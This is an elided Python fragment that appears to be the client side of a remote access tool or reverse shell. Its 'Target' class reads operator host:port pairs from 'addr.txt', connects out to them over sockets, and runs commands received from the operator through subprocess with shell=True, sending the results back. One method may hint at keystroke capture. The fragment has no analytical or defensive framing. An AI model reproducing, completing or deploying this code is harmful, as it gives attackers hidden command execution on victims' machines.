...
class Target:
    def __init__(self):
        ...
        if(os.path.exists('addr.txt')):
            ...
            for addr in content.split():
                addr=addr.split(":")
                self.ADDR.append([addr[0],addr[1]])
            self.HOST=self.ADDR[0][0]
            self.PORT=int(self.ADDR[0][1])
    ...
    def dlc_pr(self,key):
        ...
        try:
            ...
            self.as1d.stop()
    def dlc_ls(self):
        self.dlc_socket.connect((self.ADDR[1][0],int(self.ADDR[1][1])))
    ...
    def default(self):
        if(not '-wo' in self.cmd):
            ...
            try:
                ...
                self.send_err_p(repr(err))
                return False
            proc=subprocess.Popen(self.cmd_list[2:],stdout=subprocess.PIPE,stderr=subprocess.STDOUT,shell=True,creationflags=subprocess_flags)
            self.socket.send(b'1<END>')
